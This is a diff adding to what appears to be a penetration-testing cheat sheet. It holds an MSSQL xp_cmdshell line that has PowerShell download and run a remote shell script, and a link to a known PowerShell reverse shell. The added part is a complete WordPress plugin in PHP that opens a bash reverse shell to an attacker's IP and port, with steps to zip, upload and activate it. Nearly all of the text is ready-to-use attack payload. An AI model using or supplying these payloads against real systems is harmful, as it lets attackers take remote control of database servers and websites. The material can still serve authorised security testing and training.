@@ -1382,3 +1382,32 @@ RECONFIGURE;
 EXEC xp_cmdshell "powershell iex(iwr -usebasicparsing http://{IP}/shell.ps1)";
 
 => You can try use : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+#INDEX
+
+#EXAMPLE
+
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: H0j3n
+* Author URI: https://h0j3n.blog/
+*/
+
+exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'");
+?>
+
+=> save as shell.php
+=> zip shell.zip shell.php
+=> Upload Plugin and Activate
+
+
+
+
+
+
+
